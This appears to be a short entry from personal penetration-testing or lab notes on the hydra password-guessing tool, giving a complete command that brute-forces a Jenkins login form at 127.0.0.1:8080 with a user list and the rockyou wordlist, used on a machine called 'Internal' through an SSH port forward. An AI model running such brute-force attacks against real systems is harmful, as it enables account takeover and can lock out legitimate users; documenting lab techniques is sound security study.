# hydra

Online password-guessing tool for protocols and HTTP forms. Use carefully: it is noisy and can lock accounts.

## Commands Used

### Jenkins HTTP form brute force

```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt \
  127.0.0.1 -s 8080 http-form-post \
  "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password"
```

Used on: **Internal** - found Jenkins credentials through a local SSH port forward.

## Related

- [../../exploits/creds/jenkins-http-form-bruteforce.md](../../exploits/creds/jenkins-http-form-bruteforce.md)
